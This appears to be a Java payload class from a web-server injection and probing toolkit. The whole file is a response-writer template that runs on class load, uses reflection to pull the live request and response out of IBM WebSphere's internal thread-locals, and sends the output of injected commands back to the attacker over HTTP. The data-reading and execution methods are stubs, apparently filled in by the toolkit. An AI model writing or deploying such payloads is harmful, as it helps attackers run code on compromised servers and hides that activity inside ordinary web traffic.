package com.reajason.javaweb.probe.payload.response;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * WAS7 暂未适配
 *
 * @author ReaJason
 * @since 2025/8/10
 */
public class WebSphereWriter {
    static {
        new WebSphereWriter();
    }

    public WebSphereWriter() {
        try {
            Object[] wsThreadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
            for (Object wsThreadLocal : wsThreadLocals) {
                if (wsThreadLocal == null) {
                    continue;
                }
                // com.ibm.wsspi.webcontainer.WebContainerRequestState
                if (wsThreadLocal.getClass().getName().endsWith("WebContainerRequestState")) {
                    // com.ibm.ws.webcontainer.srt.SRTServletRequest
                    Object request = getFieldValue(wsThreadLocal, "currentThreadsIExtendedRequest");
                    // com.ibm.ws.webcontainer.srt.SRTServletResponse
                    Object response = getFieldValue(wsThreadLocal, "currentThreadsIExtendedResponse");
                    String data = getDataFromReq(request);
                    if (data != null && !data.isEmpty()) {
                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                        try {
                            writer.write(run(data));
                        } catch (Throwable e) {
                            e.printStackTrace(writer);
                        }
                        writer.flush();
                        writer.close();
                        return;
                    }
                    break;
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
